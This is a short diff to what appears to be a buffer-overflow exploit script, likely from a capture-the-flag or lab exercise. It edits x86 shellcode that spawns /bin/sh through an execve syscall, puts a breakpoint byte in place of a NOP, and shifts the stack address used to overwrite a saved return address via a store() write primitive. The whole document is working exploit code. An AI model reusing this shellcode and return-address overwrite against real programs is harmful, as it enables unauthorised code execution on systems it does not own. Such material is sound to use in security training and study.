@@ -22,9 +22,9 @@ shellcode = [0x90909090] * 93
 
 shellcode += [
     0xc931d231,
-    0xffddf8bb, # second bit FROM THE RIGHT -> start of the address of /bin/sh
+    0xffde38bb, # second bit FROM THE RIGHT -> start of the address of /bin/sh
     0xb0c031ff,
-    0x9080cd0b,
+    0xcc80cd0b,
 ]
 
 string = [
@@ -45,6 +45,6 @@ for (i, bytes) in enumerate(shellcode):
 #     |                    Index to write at the return value address
 #     |                    |
 #     v                    v
-store(int("ffffdc74", 16), 1073741824 + 114)
+store(int("ffffdc74", 16) + 350, 1073741824 + 114)
 
 p("quit")
